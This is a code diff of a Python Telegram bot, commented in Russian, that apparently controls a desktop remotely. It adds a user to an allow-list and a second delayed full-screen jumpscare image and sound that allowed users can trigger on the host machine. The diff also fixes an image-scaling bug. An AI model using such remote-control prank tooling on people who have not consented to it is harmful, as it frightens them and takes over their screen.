@@ -42,7 +42,7 @@ monit = [m for m in screeninfo.get_monitors() if m.is_primary][0]
 
 
 DeepLightID = 1627834434  # Это айди чата бота и меня
-AllowedUsers = {'Deepl1ght', 'ZackDuraska', 'gawrgurov', 'moguss'} # Авторизованные люди по юзу из тг
+AllowedUsers = {'Deepl1ght', 'ZackDuraska', 'gawrgurov', 'moguss', 'artk0v'} # Авторизованные люди по юзу из тг
 
 CURSOR_SIZE = 15 # Константа для курсора на скрине
 CURSOR_COLORS = [
@@ -292,7 +292,7 @@ def Click(message):
 def screamer(message):
     if message.from_user.username in AllowedUsers:
         threading.Thread(target=show_screamer, daemon=True).start() # Так как основной поток занят ботом, а ткинтер не особо любит это
-                                                                    # Поэтому мы создадим отдельный поток, а это значит, что при множественном
+        threading.Thread(target=Obasravsya, daemon=True).start()    # Поэтому мы создадим отдельный поток, а это значит, что при множественном
                                                                     # Использовании скримера память быстро засорится, но вроде это не такая прям проблема
     if message.from_user.username != 'Deepl1ght':
         bot.forward_message(DeepLightID, message.chat.id, message.message_id)
@@ -521,20 +521,54 @@ def show_screamer(): # сама функция для показа скримака
 
     # Закрываем через 5 секунд
     root.after(5000, lambda: root.destroy())
+    # Запускаем ткинтер
+    root.mainloop()
+
+def Obasravsya():
+    time.sleep(5.5)
+    root = tkinter.Tk()  # создаем окно ткинтера
+    root.title("overlay")
+
+    image = Image.open(resource_path(r'screams/3.png'))  # открываем нашу пикчу
+    mon = [m for m in screeninfo.get_monitors() if m.is_primary == True][0]
+    mwidth = mon.width
+    mheight = mon.height
+    newimage, cords = calculate_scale(image, mwidth, mheight, image.size[0], image.size[1])
+    # Скрываем название
+    root.overrideredirect(True)
+
+    # Короче делаем красный цвет прозрачным
+    root.attributes("-transparentcolor", "red")
+
+    # Заливаем фон красным (прозрачным)
+    root.config(bg="red")
+    img = ImageTk.PhotoImage(newimage)
+    l = tkinter.Label(root, fg="white", bg="red", image=img)
+    l.pack()
+
+    # Проигрываем звук
+    mix.music.load(resource_path(r'screams/1.wav'))
+    mix.music.play()
+
+    # Делаем так, чтобы окно было всегда поверх других
+    root.geometry(cords)
+    root.wm_attributes("-topmost", 1)
+
+    # Закрываем через 5 секунд
+    root.after(5000, lambda: root.destroy())
 
     # Запускаем ткинтер
     root.mainloop()
+
 
 def calculate_scale(image, mon_width, mon_height, img_width, img_height): # Функция для увелечения картинки,
                                                                           # Также возвращает строку с геометрией для tk.geometry()
 
     scale = min([mon_width//img_width, mon_height//img_height]) # Коэффициент увеличения картинки
 
-    ret = image.resize((img_width*scale, img_height*scale)) # Увеличиваем картинку
+    ret = image.resize((img_width*scale, img_height*scale)) if scale>0 else image# Увеличиваем картинку
 
     cords = f"{ret.size[0]}x{ret.size[1]}+{mon_width//2-ret.size[0]//2}+{mon_height//2-ret.size[1]//2}" # создаем строку с разрешением и смещением для ткинтера
-
-    ret = ImageTk.PhotoImage(ret) # Переделываем полученное изображение
 
     return ret, cords # Возвращаем обе переменных
 
